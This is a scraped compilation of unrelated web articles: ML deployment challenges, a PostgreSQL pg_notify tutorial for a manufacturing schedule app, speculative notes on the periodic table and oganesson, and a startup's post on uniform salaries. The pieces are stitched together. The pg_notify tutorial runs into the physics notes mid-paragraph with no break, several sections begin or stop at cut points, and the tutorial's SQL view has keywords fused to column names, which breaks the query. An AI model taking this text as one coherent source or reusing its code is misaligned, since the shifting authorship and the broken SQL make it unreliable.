<p><em>However, discussing applications of ML in theory is much different than actually applying ML models at scale in production. In this article, we walk through common challenges and corresponding solutions to making ML a force multiplier for your data organization.&nbsp;</em></p>



<p>From generating your weekend bike route on Google Maps to helping you discover your next binge-worthy show on Netflix, machine learning (ML) has evolved well beyond a theoretical buzzword into a powerful technology that most of us use every day.&nbsp;</p>



<p>For the modern business, the appetite for ML has never been stronger. But while certain industries have been transformed by the automation made possible by ML—think <a href="https://www.businessinsider.com/ai-in-banking-report" target="_blank" rel="noopener">fraud detection</a> in finance and <a href="https://customerthink.com/explained-working-and-advantages-of-a-recommendation-engine/" target="_blank" rel="noopener">personalized product recommendations</a> in e-commerce—the hard truth is that many ML projects fail before they ever see the light of day.&nbsp;</p>



<p>In October 2020, <a href="https://www.gartner.com/en/newsroom/press-releases/2020-10-19-gartner-identifies-the-top-strategic-technology-trends-for-2021#:~:text=Gartner%20research%20shows%20only%2053,a%20production%2Dgrade%20AI%20pipeline." target="_blank" rel="noopener">Gartner reported</a> that only 53% of projects make it from prototype to production—and that’s at organizations with some level of AI experience. For companies still working to develop a data-driven culture, that number is likely far higher, with <a href="https://venturebeat.com/2019/07/19/why-do-87-of-data-science-projects-never-make-it-into-production/" target="_blank" rel="noopener">some failure-rate estimates</a> soaring to nearly 90%.&nbsp;</p>



<p>Data-first tech companies like Google, Facebook, and Amazon are transforming our daily lives with ML, while many other well-funded and highly talented teams are still struggling to get their initiatives off the ground. But why does this happen? And how can we fix it?</p>



<p><strong>We share the four biggest challenges modern data teams face when adopting ML at scale— and how to overcome them.&nbsp;</strong></p>



<h3>Misalignment between actual business needs and ML objectives</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg" alt="" width="768" height="512" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1024x683.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-300x200.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-768x512.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-1536x1024.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/charles-deluvio-pjAH2Ax4uWk-unsplash-1-2048x1365.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>When your business objectives and ML goals are misaligned, all of your best laid plans are bound to fail, just like that model you trained with stale data.

<p>The first challenge is strategic, not technical: starting with a solution instead of a clearly defined problem.&nbsp;</p>



<p>As companies race to incorporate ML into their organizations, leaders may hire data scientists and ML practitioners to automate or improve processes without a mature understanding of <a href="https://developers.google.com/machine-learning/problem-framing/good" target="_blank" rel="noopener"><strong>which problems are actually suitable for ML</strong></a> to solve. And even when the business problem is a good fit for ML, without a shared definition of what success looks like, projects can languish in experimentation mode for months while stakeholders wait for an idealized level of machine-like perfection that can never be reached.&nbsp;</p>



<p>Machine learning is not magic, it will not solve every problem perfectly, and should, by nature, continue to evolve over time. Sometimes, a model merely achieving the same results as humans is a worthy project—errors and all.&nbsp;</p>



<p>Before starting any project, ask your team or your stakeholders: <em>What business problem are we trying to solve? Why do we believe that ML is the right path? What is the measurable threshold of business value this project is trying to reach? What does “good enough” look like?&nbsp;</em></p>



<p>Without these clear, shared definitions articulated at the outset, many worthy ML projects will never reach production and valuable resources will be wasted. Solve a business problem using ML and not just embark on a ML project for checking off the ML box.</p>



<h3>Model training that doesn’t generalize</h3>



<p>With a clearly defined business problem and targeted success metrics, your potential pitfalls get more technical. During the model training stage, issues related to your training data or model fit are the likeliest culprit for future failure.&nbsp;</p>



<p>The goal of <a href="https://elitedatascience.com/model-training" target="_blank" rel="noopener"><strong>model training</strong></a> is to develop a model that can generalize, or make accurate predictions when given new data because it understands the relationships between data points and can identify trends. Your training dataset should be clean, sizable, and representative of the real-time data your model is expected to process once in production. No where has one seen clean data in a production environment. Expect to spend considerable time cleaning, labeling&nbsp; and feature engineering just to get the data ready.</p>



<p>Representative training data is also key: If your training data doesn’t reflect the actual datasets your model will encounter, you may end up with a model that won’t perform once you’ve reached testing or production.&nbsp;</p>



<p>Another issue that can occur during training is overfitting and underfitting. Overfitting happens when a model learns <em>too much </em>and produces outputs that fit too closely with your training data.</p>



<p>Underfitting is simply the opposite—your model doesn’t learn enough to make useful predictions on even the training data itself, let alone new data it will encounter in testing or production.</p>



<h3>Testing and validation issues</h3>



<p>As you test and validate your models, new challenges can arise from merging multiple data streams and making updates to improve performance. Changes to data sources, model parameters, and <a href="https://en.wikipedia.org/wiki/Feature_engineering" target="_blank" rel="noopener"><strong>feature engineering</strong></a> all introduce room for error.&nbsp;</p>



<p>This may also be the stage when you detect overfitting or underfitting in your model—a model that performed wonderfully during training but fails to produce useful results during testing may be overfit.&nbsp;</p>



<p>Even at companies like Google, where ML engineers abound, <a href="https://www.technologyreview.com/2020/04/27/1000658/google-medical-ai-accurate-lab-real-life-clinic-covid-diabetes-retina-disease/" target="_blank" rel="noopener">surprises</a> in your product models can—and will—arise.&nbsp;</p>



<h3>Deployment and serving hurdles</h3>



<p>Deploying ML projects is rarely simple, and teams typically can’t use consistent workflows to do so—since ML projects solve a wide range of business problems, there’s a similarly wide range of ways to host and deploy them. For example, some projects require batched predictions on a regular basis, while others need to generate and deliver predictions on-demand when an application makes an API request to predict using the model. (This is part of why it’s challenging to make models apply to different use cases, no matter how appealing it may sound to executives who may view ML models as more magic than narrowly focused functions.)</p>



<p>Additionally, some ML projects can require a lot of resources, and cross-functional teams need to agree upon priorities of deployment. Engineers only have so many things they can productionalize, and as we’ve discussed, ML projects are much more than models and algorithms: most will need infrastructure, alerting, maintenance, and more to be successfully deployed.&nbsp;</p>



<p>This is why it’s so important to articulate the business problem clearly at the outset, agree upon what success looks like, design an end-to-end solution, and have a shared understanding of your ML project’s value compared to other priorities. Without this strategic plan, your project may never receive the engineering resources it needs to finally reach production.&nbsp;</p>



<p>For just one example, Netflix never productionalized its <a href="https://www.wired.com/2012/04/netflix-prize-costs/" target="_blank" rel="noopener">million-dollar prize-winning recommendation algorithm</a> due to the winning model’s complexity to implement—instead choosing another submission that was simpler to integrate.&nbsp;&nbsp;</p>



<h3>Tactics for scalable ML in production</h3>



<div><figure><img loading="lazy" src="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1024x687.jpg" alt="" width="768" height="515" srcset="https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1024x687.jpg 1024w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-300x201.jpg 300w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-768x515.jpg 768w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-1536x1030.jpg 1536w, https://314eeh1sonxi1dnazoipvkl6-wpengine.netdna-ssl.com/wp-content/uploads/2021/03/kobu-agency-67L18R4tW_w-unsplash-2048x1373.jpg 2048w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>Machine learning isn’t magic, but it is powerful—and often misunderstood.&nbsp; Sort of like this paper stick figure. Image courtesy of <a href="https://unsplash.com/photos/67L18R4tW_w" target="_blank" rel="noopener">Kobu Agency</a> on <a href="http://www.unsplash.com/" target="_blank" rel="noopener">Unsplash.</a></figcaption></figure></div>



<p>Beyond strategic planning and staffing, there are concrete steps you can take to help scale your ML production.&nbsp;</p>



<h4>Lean into the cloud</h4>



<p>If your teams are working locally instead of in the cloud, it’s time to shift. Working in the cloud is the “glue” that keeps model training and deployment workflows in lockstep. Most vendors and open-source tools are developed for the cloud, and once there, it’s much easier to automate processes. Testing, training, validation and model deployment needs to be a repeatable process, it should not go from local Python code to a production environment.</p>



<h4>Leverage a DevOps approach</h4>



<p>Just as we’ve talked about applying DevOps practices to data, like <a href="https://www.montecarlodata.com/how-to-make-your-data-pipelines-more-reliable-with-slas/"><strong>setting data SLAs</strong></a> and measuring data health along <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/">observability pillars</a>, ML teams can follow in DevOps’ footsteps by implementing the <strong><a href="https://www.infoworld.com/article/3271126/what-is-cicd-continuous-integration-and-continuous-delivery-explained.html" target="_blank" rel="noopener">Continuous Integration (CI) and Continuous Delivery (CD)</a> model</strong>, while introducing <a href="https://cloud.google.com/solutions/machine-learning/mlops-continuous-delivery-and-automation-pipelines-in-machine-learning" target="_blank" rel="noopener">Continuous Training (CT)</a>. By setting up agile build cycles and tools, ML teams can more rapidly deliver changes into the codebase and improve overall performance.&nbsp;</p>



<p>Similar to DevOps best practices, ML teams should use containerization to consistently run software across any type of device and make it simpler for engineers to productionalize their work. Keeping a consistent and visible build process that deploys smaller changes more frequently allows the team to work more smoothly and have more insight into what’s working well, and what’s not. Visibility also helps would-be code “gatekeepers” trust the build process and speed up the ML team’s workflow.&nbsp;</p>



<p>Investing time to build a strategic MLOps team and processes will help by reducing the likelihood of a project stalling out before production, and making continuous improvements feasible—setting every project up for long-term success.</p>



<h4>Invest in observability and monitoring&nbsp;</h4>



<p>Finally, the primary rule of machine learning is that your outcomes will only be as good as your inputs. Healthy data is absolutely essential to ML. Without clean data and working pipelines, models won’t be able to perform to their fullest potential and may fail to make accurate predictions.&nbsp;</p>



<p>And when you’re relying on ML to make important business decisions, you don’t want to find out about a broken pipeline or inaccurate data after those outputs have already been delivered.&nbsp;</p>



<p>That’s why <a href="https://www.montecarlodata.com/introducing-the-5-pillars-of-data-observability/"><strong>data observability</strong></a>, which provides a full understanding and comprehensive monitoring of data health—and can prevent bad data from reaching your ML models in the first place—is well worth the investment.&nbsp;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <p>We’re going to take a look how I used a Postgres feature, <code>pg_notify</code>, to power a work schedule for a manufacturing company. This particular product went through a dozen or so stages of manufacture, and each time a product advanced to its next stage the worker would record that progress from their workstation. The app we will build in this post displayed this schedule and allowed everyone to see the day’s progress.</p><h3 id="the-observer-pattern-in-sql">The Observer Pattern in SQL</h3><p>If you’re only used to using the standards of SQL in Postgres, the <code>NOTIFY</code> and <code>LISTEN</code> commands might not be familiar. But with these two commands you can implement something akin to the Observer pattern, but in your SQL engine!</p><p>The Observer pattern allows one class of object to “listen” for incoming events and another class to send events to those listeners. This pattern is commonly used for instances where data is being updated or changed, and several possibly unrelated objects need to react to those changes.</p><h3 id="observer-examples">Observer Examples</h3><p>Listening to state changes from a Redux store from inside of a React component is a common example of this pattern. Many React components listen to a single part of the Redux store. Android’s LiveData is another great example of this pattern, where observers can be created to watch for changes and immediately update the state and UI of an app.</p><h3 id="observing-in-postgresql">Observing in PostgreSQL</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1000w, https://blog.arctype.com/content/images/2021/03/Screen-Shot-2021-02-03-at-19.18.43.png 1600w" sizes="(min-width: 720px) 720px"><figcaption>System architecture with pg_notify as the event bus.</figcaption></figure><p><code>NOTIFY</code> and <code>LISTEN</code> work together to allow you to implement this design within your Postgres database. Generally, <code>NOTIFY</code> will be called inside of a SQL query, oftentimes within a trigger. <a href="https://blog.arctype.com/learn-sql-triggers/">Triggers and event-based models go together well.</a> </p><!--kg-card-begin: html--><p>
    <h3>Looking for a collaborative SQL Editor?</h3>
    
</p><!--kg-card-end: html--><p><code>LISTEN</code> is called from your Postgres client. When an event is triggered by <code>NOTIFY</code> the client will be notified. The event contains a payload so the client can tell what event was triggered (this can also contain metadata or actual data from the database). How your client receives this notification and how you are able to process it from there varies from client to client. In our example, the client will use WebSockets to update each connected schedule client after it receives the signal from <code>pg_notify</code>.</p><h2 id="building-the-work-schedule-app">Building the Work Schedule App</h2><h3 id="schema-design">Schema Design</h3><p>Let’s begin on the Postgres side. We are modeling items that are being manufactured. Items in production will be represented by the <code>production_item</code> table. Each <code>production_item</code> has an associated <code>product_id</code> &nbsp;and a current stage of production. </p><figure><img src="https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/Frame-27--1-.png 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/Frame-27--1-.png 1000w, https://blog.arctype.com/content/images/2021/03/Frame-27--1-.png 1498w" sizes="(min-width: 720px) 720px"><figcaption>ERD Diagram made with <a href="https://blog.arctype.com/erd-builder/">Arctype's Free Figma template</a>.</figcaption></figure><p>We could store the current production stage as a column in the <code>production_item</code> table, but that would only allow us to see what stage the item is in currently. Instead, we’ll use a <code>production_item_wip</code> (work-in-progress) table where each row will contain a timestamp as the item progresses through the stages of production. Let’s also create a table that stores all the possible stages of production, <code>production_stage</code>. <code>production_stage</code> will have an <code>idx</code> integer column to store the order in which the stages occur. The query below creates the <code>production_item_wip</code> table, as an example.</p><pre><code>create table production_item_wip (  
  id serial primary key,  
  insert_time timestamp default NOW(),  
  production_item_id int references production_item(id),  
  production_stage_id int references production_stage(id),  
  employee_id int references employee(id)  
); </code></pre><p>PROTIP: You may notice I’ve included <code>insert_time</code> on every table. We will not need to use this column on every table for this particular example right now, but I’ve found that it often proves useful in the future. I spend a significant amount of time building queries and extracting useful statistics, and countless times I’ve been unable to use data because it lacked an <code>insert_time</code>. I would err on the side of adding it when designing database schema in general, if you’re unsure whether or not you should.</p><h3 id="postgres-notify-syntax">Postgres NOTIFY Syntax</h3><p>Using NOTIFY to send an event is dead simple! Here is a trigger procedure that sends a notification to the order_progress_event channel.</p><pre><code>create
or replace function fn_production_stage_modified() returns trigger as $psql$
begin
  perform pg_notify(
    'order_progress_event',
    'Time to refresh those screens!'
  );return new;
end;$psql$ language plpgsql;</code></pre><p><code>pg_notify</code> lends itself well to being used within a trigger when used to deliver real-time data streaming. However, you could just as easily call <code>pg_notify</code> from a regular SQL query: <code>select pg_notify('order_progress_event', 'Hello world!');</code></p><p>Inside of a PL/pgSQL procedure, you cannot <code>SELECT</code> a function, like <code>pg_notify</code>, that returns void. Doing so will cause a Postgres error. That’s why in the first example we use <code>perform</code>, while in the second we can simply use <code>select</code>.</p><p>With that procedure created, let’s add the actual trigger so that whenever an item moves along in the production process, and thus another row is inserted for <code>production_item_wip</code>, the procedure above is called.</p><pre><code>create trigger production_stage before
insert
  on production_item_wip for each row execute procedure fn_production_stage_modified();</code></pre><!--kg-card-begin: html--><p>
    <h3>The Collaborative SQL Editor</h3>
    
</p><!--kg-card-end: html--><p>That’s it! In this example the payload is the same each time. You could send actual data rather than just an alert, but in this example I prefer to send a basic notification so the client application can receive it and then in turn, select <em>exactly</em> what it needs in a separate query.</p><p>Encoding data within a notification, whether it’s a push notification or one from something like <code>pg_notify</code>, requires you to abstract away the source of the notification, assuming the data is normally delivered via an HTTP API. Using notifications as a “hint” for your software to reach out and get fresh data from an HTTP API simplifies the process and helps you reduce the number of different data sources you need to maintain.</p><h3 id="postgres-listen-syntax">Postgres LISTEN Syntax</h3><p>Listening to a channel is even simpler: <code>LISTEN order_progress_event;</code> </p><p>That really is all.</p><p>When this event is called, we’ll want to select the latest production data for the day. Here’s a view that will show how many products have progressed through each production stage today:</p><pre><code>create view view_daily_production_stats as
select
  count(1) as stage_count,
  ps.name as stage_namefrom production_item_wip piw
  join production_stage ps on ps.id = piw.production_stage_idwhere date(piw.insert_time) = date(now())
group by
  ps.id</code></pre><p>Now that your client is listening, how can you react to events it receives? This varies by client, since the featuresets of programming languages that serve async events vary heavily. We are using JavaScript’s <code>pg</code> client in this example. JavaScript is commonly used for asynchronous web programming.</p><pre><code>var clients = [];
function eventCallback(event) {
  query('select * from view_daily_production_stats', (data) =&gt; {
    clients.map(c =&gt; {
      c.send(data);
    });
  });
}
client.connect(function(err, client) {
  var query = client.query("LISTEN order_progress_event");
  client.on("notification", eventCallback);
});
;  </code></pre><p>Whenever a new event is received by the PostgreSQL client, the function <code>eventCallback</code> will be called with the payload from <code>NOTIFY</code>. The callback then queries the view we wrote earlier to select the most recent production stage data, and loops through to send the new data to all of the listening clients (Raspberry Pis). The clients receive the data and render HTML.</p><h3 id="putting-it-all-together">Putting it all Together</h3><figure><img src="https://blog.arctype.com/content/images/2021/03/IMG_0744.JPG" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2021/03/IMG_0744.JPG 600w, https://blog.arctype.com/content/images/size/w1000/2021/03/IMG_0744.JPG 1000w, https://blog.arctype.com/content/images/2021/03/IMG_0744.JPG 1600w" sizes="(min-width: 720px) 720px"></figure><p><code>pg_notify</code> is simple, built-in to PostgreSQL feature that has tons of different potential use cases.

      <strong>Status:</strong> <em>Rough working notes – me
      thinking aloud. Speculative, and likely contains errors,
      misconceptions, and omissions; thoughtful, informed comments are
      welcome. Intended for a general scientifically curious audience,
      not requiring much detailed specialist background.</em>
    </p>
    
    <p>
      It is sometimes said physics is nearing its end – closing
      in on a “theory of everything” – because we
      understand so much about the basic rules governing the particles
      and forces in our universe. This is like asserting that computer
      science ended in 1936 with the Turing machine, computing's
      “theory of everything”. Of course, that's not what
      happened. Rather, the invention of the Turing machine opened a
      new creative frontier, enabling an extraordinary profusion of
      new ideas.
    </p>

    <p>
      Science is going through a similarly exciting transition
      today. Until recently humanity worked with matter much like we
      did computing prior to Turing, using a patchwork of bespoke
      tools and ideas. But now we understand the fundamentals of how
      matter works: we have a fantastic theory describing the
      elementary particles and forces, and we're getting increasingly
      good at manipulating matter. And so we're beginning to ask: what
      can we build, <em>in principle</em>? Not just in a practical
      sense, with the tools that happen to be at hand, but in a
      fundamental sense: what is allowed by the laws of physics?
    </p>

    <p>
      Of course, this implies a whole world of questions: What
      qualities are possible in matter? Can we do for matter what
      Turing and company did for computation? Can we invent new
      high-level abstractions and design principles for matter,
      similar to what people like John McCarthy and Alan Kay did for
      computing?  What design space is opened up when we control
      matter as well as we control pixels on a computer screen? What
      beautiful new design ideas are possible?
    </p>

    <p>
      Most of the matter in our everyday experience is constructed
      from just three particles: protons, electrons, and
      neutrons. These can be used to build an astonishing array of
      different things: diamonds; human beings; galaxies; black holes;
      iPhones. With sufficiently good tweezers and a lot of patience
      you could reassemble a human being into a bicycle of comparable
      mass; and vice versa.
    </p>

    <p>
      So, what else can we build from protons, electrons, and
      neutrons*<span>* Martin Rees has pointed out
      that we humans tend to engage in particle chauvinism, often
      assuming that what we think of as “ordinary matter”
      is all there is to matter. Indeed, I've engaged in just such a
      chauvinism in asserting above that “we understand the
      fundamentals of how matter works”.  However, based on what
      we currently suspect about dark matter, so-called
      “ordinary matter” may actually be rather unusual,
      the exception rather than the rule. Nonetheless, in the absence
      of a good understanding of dark matter I shall continue to
      engage in particle chauvinism, and restrict myself in this essay
      to ordinary matter. Indeed, I shall go further and restrict the
      discussion (mostly) to protons, electrons, and neutrons.
      </span>?
    </p>

    <p>
      It seems likely we can build things that would astonish us,
      things going radically beyond anything we can even conceive of
      today, much less build.
    </p>

    <p>
      Consider that ten million years ago conscious minds were absent
      from the earth, except in quite primitive forms. Might there be
      forms of matter possible which are as different from anything
      familiar to us today as consciousness is from a
      rock*<span>* Some people don't believe
      consciousness is a property of matter. There are limited senses
      in which that is reasonable: certainly, matter is a substrate,
      and aspects of consciousness may be independent of the details
      of that substrate, in a matter analogous to the way an algorithm
      has an existence independent of the computer it runs
      on. Nonetheless, I don't think there is much serious reason to
      doubt that consciousness is a property that emerges out of
      ordinary matter.</span>?
    </p>
    
    <p>
      What might those forms be?
    </p>

    <p>
      One way to explore the “what can we build?” question
      is to look at different <em>maps of matter</em>. Probably the
      best known such map is the periodic table, showing all the
      different types of atoms which make up most of the matter in the
      world around us. But there's many other maps of matter. There's
      phylogenetic trees, which show the relationship between
      different types of life. There's maps of the different types of
      stars, of the different phases of matter, of all the proteins
      we've found. And many more.
    </p>

    <p>
      In these notes we'll go on safari through several such maps of
      matter. We won't go too deep into any individual map –
      everything I discuss could be (often has been) the subject of
      PhD theses, or even an entire field. Instead, we're going to
      look rapidly at several different ways we explore matter. The
      purpose is to discern some general principles that can help us
      explore in generative ways.
    </p>

    <p>
      When I began writing these notes I had a whimsical question in
      mind: is there a single, unified map we can use to understand
      all of matter? I hoped the attempt to make such a unified map
      would give me some insight into the question “what can we
      build, in principle?” And so, as I wrote the notes I toyed
      with multiple ways of making a unified map. Eventually, I
      realized matter is too rich and variegated for a really good
      unified map to be possible. What's more, to do even a passing
      job these notes would need to be a hundred times longer!
      Nonetheless, I found the attempt stimulating. And so at the end
      of the notes I show a single diagram which encapsulates many of
      the ideas for exploration developed in these notes. It's grossly
      incomplete, but hopefully interesting and generative.
    </p>

    <h2>The strangest places in the periodic table</h2>

    <p>
      The physicist John Wheeler once stated a useful principle to
      guide research: “In any field, find the strangest thing
      and explore it”. One great thing about maps is that they
      suggest strange things. This is true even when the map itself is
      familiar, like the periodic table. We can ask ourselves: where
      are the strangest “places” in the periodic table?
      And then challenge ourselves to explore those places.
    </p>

    <p>
      One candidate for the strangest place in the periodic table is
      the most recently discovered chemical element, oganesson. It's
      the heaviest known element, with an atomic number of 118. It's
      highlighted below with a red circle in the bottom
      right*<span>* Image adapted from images due
      to users “Double sharp” and “Offnfopt”
      on <a href="https://commons.wikimedia.org/wiki/File:Simple_Periodic_Table_Chart-blocks.svg">Wikipedia</a>.</span>:
    </p>

    <center>
    <img src="https://futureofmatter.com/assets/periodic_table.svg" width="100%">
    </center>
    
    <p>
      Oganesson was discovered in 2002 by a team of scientists headed
      by Yuri Oganessian, after being predicted in 1895 by Hans Peter
      Jørgen Julius Thomsen. It was made by using calcium ions to
      bombard a target of californium atoms, at very high speed. Only
      a handful of oganesson atoms have ever been observed –
      around a half dozen, with several of those observations regarded
      as unconfirmed.
    </p>

    <p>
      We don't know much for sure about oganesson – the handful
      of atoms observed decayed too quickly to get much idea of what
      oganesson does. Despite this, intensive theoretical studies have
      been done, and some surprising predictions made. Oganesson is in
      the final column of the periodic table, and these are of course
      the “noble gases”, highly non-reactive gases like
      helium and argon.
    </p>

    <p>
      At least, that's the story we learn in high school chemistry. In
      fact, oganesson confounds these expectations. Theoretical
      calculations suggest oganesson is likely to be a solid
      semiconductor at standard temperature and pressure, not a
      gas. Furthermore, it may be significantly reactive, unlike the
      other noble gases*<span>* Clinton
      S. Nash, <a href="https://pubs.acs.org/doi/10.1021/jp050736o">Atomic
      and Molecular Properties of Elements 112, 114, and 118</a>
      (2005). Note that the other noble gases <em>are</em> at least
      somewhat reactive (disodium helide, anyone?)
      – <a href="https://en.wikipedia.org/wiki/Noble_gas_compound">Wikipedia's
      discussion is a good place to start</a> – but oganesson is
      predicted to be significantly moreso.</span>.
    </p>

    <p>
      There is a standard argument for why noble gases are
      non-reactive gases – the gist is to understand the
      electron orbital shell structure, the number of electrons in
      each, and why full shells are particularly stable and lead to
      non-reactive elements. What you learn from oganesson is that
      some of the principles underlying that argument can't be quite
      right. I must admit, I haven't worked through the details of how
      the standard argument breaks down (beyond quickly skimming the
      above paper); nonetheless, it's extremely useful to have a
      little flag in my head saying that the standard argument about
      electron orbitals and noble gases actually breaks down for some
      elements.  That argument is often presented as being based on
      universal principles, but those principles are not, in fact,
      universal.
    </p>

    
    <p>
      And so one benefit of exploring oganesson is that it improves
      other parts of your understanding of matter, even if only by
      informing you of limits to that understanding. And it pokes at
      you: the periodic table has the shape it does <em>because</em>
      of those underlying principles. If …</p></div></div>

March 4, 2021 | https://oxide.computer/blog/compensation-as-a-reflection-of-values/ | <a href="https://web.archive.org/web/*/https://oxide.computer/blog/compensation-as-a-reflection-of-values/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Compensation: the word alone is enough to trigger a fight-or-flight reaction in many. But we in technology have the good fortune of being in a well-compensated domain, so why does this issue induce such anxiety when our basic needs are clearly covered? If it needs to be said, it's because compensation isn't merely about the currency we redeem in exchange for our labors, but rather it is a proxy for how we are <em>valued</em> in a larger organization. This, in turn, brings us to our largest possible questions for ourselves, around things like meaning and self-worth.</p><p>So when we started Oxide -- as in any new endeavor -- compensation was an issue we had to deal with directly. First, there was the thorny issue of how we founders would compensate ourselves. Then, of course, came the team we wished to hire: hybrid local and remote, largely experienced to start (on account of <a href="https://www.youtube.com/watch?v=vvZA9n3e5pc">Oxide's outrageously ambitious mission</a>), and coming from a diverse set of backgrounds and experiences. How would we pay people in different geographies? How could we responsibly recruit experienced folks, many of whom have families and other financial obligations that can't be addressed with stock options? How could we avoid bringing people's compensation history -- often a reflection of race, gender, class, and other factors rather than capability -- with them?</p><p>We decided to do something outlandishly simple: take the salary that Steve, Jess, and I were going to pay ourselves, and pay that to everyone. The three of us live in the San Francisco Bay Area, and Steve and I each have three kids; we knew that the dollar figure that would allow us to live without financial distress -- which we put at $175,000 a year -- would be at least universally adequate for the team we wanted to build. And we mean everyone literally: as of this writing we have 23 employees, and that's what we all make.</p><p>Now, because compensation is the hottest of all hot buttons, it can be fairly expected that many people will have a reaction to this. Assuming you've made it to this sentence it means you are not already lighting us up in your local comments section (thank you!), and I want to promise in return that we know some likely objections, and we'll address those. But before we do, we want to talk about the benefits of transparent uniform compensation, because they are, in a word, profound.</p><p>Broadly, our compensation model embodies our <a href="https://oxide.computer/about/">mission, principles, and values</a>. First and foremost, we believe that our compensation model reflects our principles of <b>honesty</b>, <b>integrity</b>, and <b>decency</b>. To flip it around: sadly, we have seen extant comp structures in the industry become breeding grounds for dishonesty, deceit, and indecency. Beyond our principles, our comp model is a tangible expression of several of our values in particular:</p><ul><li><p>It has set the tone with respect to <b>teamwork</b>. In my experience, the need to "quantify" one's performance in exchange for justifying changes to individual compensation are at the root of much of what's wrong in the tech industry. Instead of incentivizing people to achieve together as a team, they are incentivized to advance themselves -- usually with sophisticated-sounding jargon like OKRs or MBOs, or perhaps reasonable-sounding (but ultimately misguided) mantras like "measure everything." Even at their very best, these individual incentives represent a drag on a team, as their infrequent calibration can prevent a team from a necessary change in its direction. And at worst, they leave individuals perversely incentivized and operating in direct opposition to the team's best interest. When comp is taken out of the picture, everyone can just focus on what we need to focus on: getting this outlandish thing built, and loving and serving the customers who are taking a chance on it.</p></li><li><p>It is an expression of our <b>empathy</b>. Our approach to compensation reflects our belief in treating other people the way that we ourselves want to be treated. There are several different dimensions for this, but one is particularly visceral: because we have not talked about this publicly, candidates who have applied to Oxide have done so assuming that we have a traditional comp model, and have braced themselves for the combat of a salary negotiation. But we have spoken about it relatively upfront with candidates (before they talk to the team, for example), and (as the one who has often had this discussion) the relief is often palpable. As one recent candidate phrased it to me: "if I had known about this earlier, I wouldn't have wasted time stressing out about it!"</p></li><li><p>It is (obviously?) proof-positive of our <b>transparency</b>. Transparency is essential for building <i>trust</i>, itself one of the most important elements of doing something bold together. One of the interesting pieces of advice we got early on from someone who has had outsized, repeated success: modulo private personnel meetings, make sure that every meeting is open to everyone. For those accustomed to more opaque environments, our level of transparency can be refreshing: for example, new Oxide employees have been pleasantly surprised that we always go through our board decks with everyone -- but we can't imagine doing it any other way. Transparent compensation takes this to an unusual (but not unprecedented) extreme, and we have found it to underscore how seriously we take transparency in general.</p></li><li><p>It has allowed whole new levels of <b>candor</b>. When everyone can talk about their salary, other things become easier to discuss directly. This candor is in all directions; without comp to worry about, we can all be candid with respect to our own struggles -- which in turn allows us to address them directly. And we can be candid too when giving public positive feedback; we don't need to be afraid that by calling attention to someone's progress, someone else will feel shorted.</p></li></ul><p>These are (some of!) the overwhelming positives; what about those objections?</p><ul><li><p>Some will say that this salary is too low. While cash compensation gets exaggerated all of the time, it's unquestionable that salaries in our privileged domain have gotten much higher than our $175,000 (and indeed, many at Oxide have taken a cut in pay to work here). But it's also true that $175,000 per year puts us each in the top 5% of US individual earners -- and it certainly puts a roof over our families' heads and food in their bellies. Put more viscerally: this is enough to not fret when your kids toss the organic raspberries into the shopping cart -- or when they devour them before you've managed to get the grocery bags out of the car! And speaking of those families: nothing is more anxiety-producing than having a healthcare issue compounded by financial distress due to inadequate insurance; Oxide not only offers the best healthcare plans we could find, but we also pay 100% of monthly premiums -- a significant benefit for those with dependents.</p></li><li><p>Some will say that we should be paying people differently based on different geographical locations. I know there are thoughtful people who pay folks differently based on their zip code, but (respectfully), we disagree with this approach. Companies spin this by explaining they are merely paying people based on their cost of living, but this is absurd: do we increase someone's salary when their spouse loses their job or when their kid goes to college? Do we slash it when they inherit money from their deceased parent or move in with someone? The answer to all of these is no, of course not: we pay people based on their work, not their costs. The truth is that companies pay people less in other geographies for a simple reason: because they can. We at Oxide just don't agree with this; we pay people the same regardless of where they pick up their mail.</p></li><li><p>Some will say that this doesn't scale. This is, at some level, surely correct: it's hard to envision a multi-thousand employee Oxide where everyone makes the same salary -- but it has also been (rightly) said that startups should do things that don't scale. And while it seems true that the uniformity won't necessarily scale, we believe that the values behind it very much 